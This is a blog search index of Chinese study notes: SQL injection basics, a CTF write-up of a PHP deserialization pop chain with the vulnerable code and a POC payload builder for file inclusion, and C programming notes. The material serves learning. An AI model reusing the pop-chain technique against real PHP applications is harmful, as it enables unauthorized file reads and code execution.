<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>周记4-SQL注入,pop链</title>
      <link href="/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/"/>
      <url>/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>何为sql注入?简单来说就是攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作</p><p>例如对于一些安全性较低的登录页面,因为这些用户的数据都是存储在数据库中,那么就可以进行SQL注入来查询敏感信息或者做更多恶意操作</p><h3 id="mysql数据库结构"><a href="#mysql数据库结构" class="headerlink" title="mysql数据库结构"></a>mysql数据库结构</h3><p>mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。</p><p><strong>mysql数据库常用默认的端口为3306</strong></p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p>在进行SQL注入之前,我们肯定要学习一下SQL语句,接下来介绍一些常用的语句和基本语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">启动运行mysql:</span><br><span class="line">在命令行输入mysql -u root -p后输入密码root</span><br><span class="line"></span><br><span class="line">基本规范:</span><br><span class="line">sql语句要在末尾加分号</span><br><span class="line">建议区分大小写(windows系统对大小写不敏感但Linux系统区分大小写)</span><br><span class="line">数据库基本结构为 数据库-&gt;表-&gt;列-&gt;单元</span><br><span class="line"></span><br><span class="line">数据库/表(若对表操作就把其中的database换成table):</span><br><span class="line">创建一个名为ytm666的数据库:create database ytm666;</span><br><span class="line">删除一个名为ytm666的数据库:drop database ytm666;</span><br><span class="line">使用一个名为ytm666的数据库:use ytm666;</span><br><span class="line">展示出服务器下的所有数据库:show databases;</span><br><span class="line"></span><br><span class="line">常用数据类型:</span><br><span class="line">int float double char和C语言同理,但有一个不同的是varchar即为长一点的字符串</span><br><span class="line"></span><br><span class="line">重要特性(赋给表中数据的特性):</span><br><span class="line">primary key 主键,唯一并且不能为空</span><br><span class="line">unique 唯一</span><br><span class="line">not null 不能为空</span><br><span class="line">auto_increment 自增</span><br><span class="line">* 此符号在sql语言中代表所有</span><br><span class="line"></span><br><span class="line">基本语句:</span><br><span class="line">use 一个数据库</span><br><span class="line">select 要查的数据 from 表名 where 列名 = 某个值</span><br></pre></td></tr></table></figure><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>利用PHP中对象的自动调用魔术方法特性,将多个类和方法串联起来,形成一个链式调用.当PHP反序列化时,会自动调用这些方法,触发代码执行</p><p>而在此重点就是PHP中的魔术方法,正好总结下</p><p><img src="https://img-blog.csdnimg.cn/569baebce8af4d848e97b34cfc8130d1.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/112c8e398f6c44d0874c10fe2b08e79d.png" alt="1"></p><p>接下来通过一道ctf例题解析一下pop链的解法和思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>首先这类题一定是要先找到能进行命令执行或文件包含的地方,那么我们发现在Modifier类中有一个方法内有可以产生文件包含漏洞的函数include(),那我们的思路就是想办法触发魔术方法来调用append方法,并且传给value的值为’flag.php’</p></li><li><p>不难发现我们需要触发__invoke()这个魔术方法来调用append方法,并且传给value的值为这个类中的var值,那么后面的poc中var值就要为’flag.php’,但要触发这个魔术方法,需要将对象当作函数调用</p></li><li><p>那么接下来为了触发__invoke()魔术方法,如何将Modifier对象当作函数调用,观察接下来的代码,我们发现在Test类中的__get()魔术方法中可以实现把对象当作函数调用,且需要将赋给$function的$p为Modifier实例,即$p&#x3D;new Modifier(),那么触发这个魔术方法需要调用这个类中属性不存在或不可访问属性的成员</p></li><li><p>继续,为了触发__get()魔术方法,我们要继续利用其他方法来实现触发,发现在Show这个类中的__toString()魔术方法中存在连续的引用,那么我们可以将这个类中的$str的值赋为Test对象,因此这个魔术方法内的这句话return $this-&gt;str-&gt;source;就成为了调用Test对象中的source成员了,又因为Test类中没有source这个成员,所以实现引用Test对象中不存在的成员,触发__get()魔术方法,那么又该如何触发__toString()魔术方法来实现这样的过程呢</p></li><li><p>那么要触发__toString()魔术方法,要将Tset对象作为字符串调用,依旧是去寻找能实现这种过程的部分,发现在这个类中存在__wakeup()魔术方法,其中我们可以利用echo函数来将Test对象作为字符串调用,那么只需要将source值赋为new Test(),并触发__wakeup()魔术方法就能实现,最后一步就是触发这个魔术方法了</p></li><li><p>最后,只需要进行反序列化操作,__wakeup魔术方法就会被调用,那么层层递推,就实现我们的需要了</p></li></ol><p><strong>总结一下</strong>:通过上面的分析,最后大致总结下来就是一个这样的过程:</p><p>分析后编辑好POC并进行序列化(url编码) <strong>&gt;&gt;</strong> 将结果传参,进行反序列化 <strong>&gt;&gt;</strong> 触发__wakeup <strong>&gt;&gt;</strong> 触发__toString <strong>&gt;&gt;</strong> 触发__get <strong>&gt;&gt;</strong> 触发__invoke <strong>&gt;&gt;</strong> 最后成功利用文件包含,得到答案</p><p>这种环环相扣,层层递进的过程就是构造pop链,最后展示一下POC以更好理解:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mod</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$mod</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>之前做到一题发现自己知识的缺口,现在做出补充</p><p>在php反序列化时如果要把一个类中成员的值赋给另一个成员需要用到引用符,例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">CLazz</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;b = &amp;<span class="variable">$c</span>-&gt;a;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记4</title>
      <link href="/2023/10/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-25-%E7%AC%94%E8%AE%B04/"/>
      <url>/2023/10/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-25-%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><p>命名相同类型的有限变量的集合，该名称是一个数组名称。</p></li><li><p>组成数组的变量称为数组的元素。</p></li></ul><h3 id="声明和访问"><a href="#声明和访问" class="headerlink" title="声明和访问"></a>声明和访问</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><p><strong>定义一个数组时所需的基本语法</strong></p><p>int scores[5]</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a><strong>初始化</strong></h4><p>int scores[5] &#x3D; {90, 85, 80, 75, 70}；</p><p><strong>初始化部分元素</strong></p><p>int scores[5] &#x3D; {90, 85};</p><p>初始化第一，第二元素，其余为0</p><p><strong>让编译器自动推断大小</strong></p><p>int scores[] &#x3D; {90, 85, 80, 75, 70};</p><h4 id="使用索引访问元素"><a href="#使用索引访问元素" class="headerlink" title="使用索引访问元素"></a><strong>使用索引访问元素</strong></h4><p>printf(“%d”, scores[0]); &#x2F;&#x2F; 输出90</p><p>pfor(int i&#x3D;0;i&lt;&#x3D;n;i++)<br>  printf(“%d”, scores[i]); &#x2F;&#x2F; 输出90</p><p><strong>注意点：数组的索引从0开始，超出数组范围的索引可能导致未定义的行为</strong></p><p><strong>用取模来实现下标循环</strong></p><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p><strong>多维数组就像是个表格，矩阵，有行和列</strong></p><h4 id="初始化和声明"><a href="#初始化和声明" class="headerlink" title="初始化和声明"></a>初始化和声明</h4><p>声明一个3x4的二维数组<br> int a [3] [4];</p><p><strong>初始化</strong><br> int a[3] [4] &#x3D; {<br> {1, 2, 3, 4},<br> {5, 6, 7, 8},<br> {9, 10, 11, 12}<br> };</p><p><strong>访问元素</strong><br> printf(“%d”, a[1][2]); &#x2F;&#x2F; 输出7</p><p><strong>使用双重循环遍历</strong><br> for (int i &#x3D; 0; i &lt; 3; i++) {<br>  for (int j &#x3D; 0; j &lt; 4; j++){</p><p>printf(“%d “, a[i][j]);</p><p> }</p><p>printf(“\n”);</p><p>}</p><p><strong>还可以用取模的方法只用一个循环遍历</strong></p><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>字符数组可以用来存储一个字符序列。例如：char name[5];</p><h4 id="字符串与字符数组"><a href="#字符串与字符数组" class="headerlink" title="字符串与字符数组"></a>字符串与字符数组</h4><p>在C中，字符串其实是一个字符数组，其中每个字符都按顺序存储，而且最后有一个额外的字符‘\0’，表示字符串的结束。这就是为什么字符串”John”实际上在内存中占据5个字符的空间：’J’, ‘o’, ‘h’, ‘n’, 和 ‘\0’。</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;John&quot;</span>; </span><br><span class="line"><span class="type">char</span> name[<span class="number">5</span>] = <span class="string">&quot;John&quot;</span>;</span><br></pre></td></tr></table></figure><p>元素为 ‘J’ ‘o’ ‘h’ ‘n’ ‘\0’</p><h4 id="访问和修改字符数组"><a href="#访问和修改字符数组" class="headerlink" title="访问和修改字符数组"></a>访问和修改字符数组</h4><p>printf(“%c\n”, name[2]); &#x2F;&#x2F; 输出h</p><p>pprintf(“%s\n”, name);&#x2F;&#x2F; 输出 John</p><p>name[2] &#x3D; ‘a’; &#x2F;&#x2F;其余元素不变</p><h4 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h4><p>头文件&lt;string.h&gt;</p><p><strong>strlen(): 返回字符串的长度（不包括结束字符\0）。</strong></p><p><strong>strcpy将一个字符串拷贝给另一个字符串<br>返回值会返回被传的字符串</strong></p><p><strong>strcat(): 连接两个字符串。</strong></p><p><strong>strcmp(): 比较两个字符串。</strong></p><p><strong>基本形式为strcmp(str1,str2)，若str1&#x3D;str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数,返回值只与第一个不同字符有关，与第二个不同字符无关</strong></p><p><strong>在字符串中找一个字符strchr（左到右），strrchr(从右到左)</strong></p><p><strong>返回值为指针，即第一次出现的位置，返回null为没找到</strong></p><p>若想找第二个字符，以下为一种方法（左到右）：</p><p>（p为指针）</p><p>p&#x3D;strchr(str,’a’);<br>p&#x3D;strchr(p+1,’a’);</p><p><strong>strstr字符串内找字符串</strong><br><strong>strcasestr找的过程内忽略大小写</strong></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>函数是C语言中的一个基本构建块，用于封装代码以执行特定的任务</p><p>函数是为执行特定任务而组织的一段程序代码,它可以有输入（称为参数）和输出（返回值）</p><p>函数就是把实现某一个功能的所有的代码打成一个包，每次需要这个功能的时候不用重复去写实现这个功能的代码，而是使用函数</p><h3 id="声明与访问"><a href="#声明与访问" class="headerlink" title="声明与访问"></a>声明与访问</h3><p><strong>声明：函数声明告诉编译器函数的名称、返回类型和参数。</strong></p><p> int add(int a,int b);</p><p><strong>定义：函数的定义提供函数的实际实现</strong><br> int add(int a, int b) {<br>  return a + b;<br> }</p><p><strong>调用</strong><br> int sum &#x3D; add(5, 6);</p><p><strong>函数的参数</strong><br> <strong>按值传递：</strong>这是C语言的默认参数传递方式，函数接收参数的值，对参数的修改不会影响调用者。</p><p><strong>按引用传递</strong>：C语言通过传递指针来实现这一点。函数接收参数地址的指针，因此可以修改原始数据。</p><p><strong>返回值</strong></p><p> 函数可以返回一个值给调用栈，这可以通过’return’语句实现</p><h3 id="形参与实参"><a href="#形参与实参" class="headerlink" title="形参与实参"></a>形参与实参</h3><p><strong>形参</strong><br> int add(int a, int b) {<br>  return a + b;<br> }</p><p><strong>实参</strong><br> int sum &#x3D; add(5, 6);</p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line"><span class="type">int</span> tmp = x;</span><br><span class="line">x = y;</span><br><span class="line">y = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">4</span>, b = <span class="number">51</span>, c = <span class="number">14</span>, d = <span class="number">1</span>;</span><br><span class="line">swap (a, d);</span><br><span class="line">swap (c, b);</span><br><span class="line">swap (b, c);</span><br><span class="line">swap (c, d);</span><br><span class="line">swap (b, d);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, a, b, c, d);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该函数无返回值，形参改变不影响实参，所以a,b,c,d还是原值</p><p><strong>数组做参数</strong></p><p>数组做参数时，传达的是一个地址</p><p>可在函数内通过对地址上的形参进行修改来修改实参</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一个函数中反复调用它自身</p><h4 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> aux)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, aux, to);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, n, from, to);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, aux, to, from);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">4</span>; <span class="comment">// Number of disks</span></span><br><span class="line">    hanoi(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);  <span class="comment">// A, B and C are names of rods</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>当n个盘的最大的盘在底部时，可将其看成n-1的盘进行移动</p><p>三个柱子，分别为  <strong>出发地，中转地，目的地</strong></p><p>每次最大盘到达目的地时，随后看成n-1盘</p><p> <strong>出发地，中转地，目的地</strong>改变</p><p>如此递归</p><h4 id="非尾递归与尾递归"><a href="#非尾递归与尾递归" class="headerlink" title="非尾递归与尾递归"></a>非尾递归与尾递归</h4><p><strong>非尾递归</strong></p><p>非尾递归意味着递归调用不是函数的最后一个操作，递归调用的结果通常需要进一步处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> duration;</span><br><span class="line"><span class="type">clock_t</span>  start, stop;</span><br><span class="line">    <span class="type">int</span> result; </span><br><span class="line">    start = clock();</span><br><span class="line">result = fib(<span class="number">40</span>); </span><br><span class="line">    stop = clock(); <span class="comment">//结束计时</span></span><br><span class="line">    duration = ((<span class="type">double</span>)(stop - start))/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>,duration); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>尾递归</strong></p><p>尾递归意味着递归调用是函数的最后一个操作。编译器能够优化尾递归，将其转换为迭代调用，这样可以避免栈溢出的问题并提高效率。</p><p>尾递归效率比非尾递归快的原因</p><p>非尾递归过程中对一相同过程进行了多次反复运行</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记3</title>
      <link href="/2023/10/22/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-22-%E7%AC%94%E8%AE%B03/"/>
      <url>/2023/10/22/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-22-%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>计算机要处理的数据(诸如数字,文字,符号,图形,音频,视频等)是以二进制的形式存放在内存中的,我们将八个比特(Bit)称为一个字节(Byte),并将字节作为最小的可操作单元</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>现实生活中我们会找一个小箱子来存放物品，一来显得不那么凌乱，二来方便以后找到。计算机也是这个道理，我们需要先在内存中找一块区域，规定用它来存放整数，并起一个好记的名字，方便以后查找。这块区域就是“小箱子”，我们可以把整数放进去了。 C语言中这样在内存中找一块区域：</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>int，它是 Integer 的简写，意思是整数。a 是我们给这块区域起的名字；当然也可以叫其他名字，例如 abc、mn123 等。 这个语句的意思是：在内存中找一块区域，命名为 a，用它来存放整数。</p><p>不过int a;仅仅是在内存中找了一块可以保存整数的区域，那么如何将 123、100、999 这样的数字放进去呢？ C语言中这样向内存中放整数：<br>&#x3D;是一个新符号，它在数学中叫“等于号”，例如 1+2&#x3D;3，但在C语言中，这个过程叫做赋值。赋值是指把数据放到内存的过程。 把上面的两个语句连起来：<br>就把 123 放到了一块叫做 a 的内存区域。</p><p>a 中的整数不是一成不变的，只要我们需要，随时可以更改。更改的方式就是再次赋值，例如：<br>第二次赋值，会把第一次的数据覆盖掉，也就是说，a 中最后的值是9999，123、1000 已经不存在了，再也找不回来了。 因为 a 的值可以改变，所以我们给它起了一个形象的名字，叫做变量。<br>int a;创造了一个变量 a，我们把这个过程叫做变量定义。<br> a&#x3D;123;把 123 交给了变量 a，我们把这个过程叫做给变量赋值；</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>内存中的数据有多种解释方式，使用之前必须要确定；上面的int a;就表明，这份数据是整数，不能理解为像素、声音等。</p><p>顾名思义，数据类型用来说明数据的类型，确定了数据的解释方式，让计算机和程序员不会产生歧义。在C语言中，有多种数据类型，例如：</p><ul><li><p>字符型: char</p></li><li><p>短整形: short</p></li><li><p>整形: int</p></li><li><p>长整型: long</p></li><li><p>单精度浮点型: float</p></li><li><p>双精度浮点型: double</p></li><li><p>无类型: void</p></li></ul><p>连续定义多个变量   为了让程序的书写更加简洁，C语言支持多个变量的连续定义。</p><h3 id="数据的长度"><a href="#数据的长度" class="headerlink" title="数据的长度"></a>数据的长度</h3><p>所谓数据长度，是指数据占用多少个字节。占用的字节越多，能存储的数据就越多，对于数字来说，值就会更大，反之能存储的数据就有限。 多个数据在内存中是连续存储的，彼此之间没有明显的界限，如果不明确指明数据的长度，计算机就不知道何时存取结束。</p><p>数据类型除了指明数据的解释方式，还指明了数据的长度。因为在C语言中，每一种数据类型所占用的字节数都是固定的，知道了数据类型，也就知道了数据的长度。 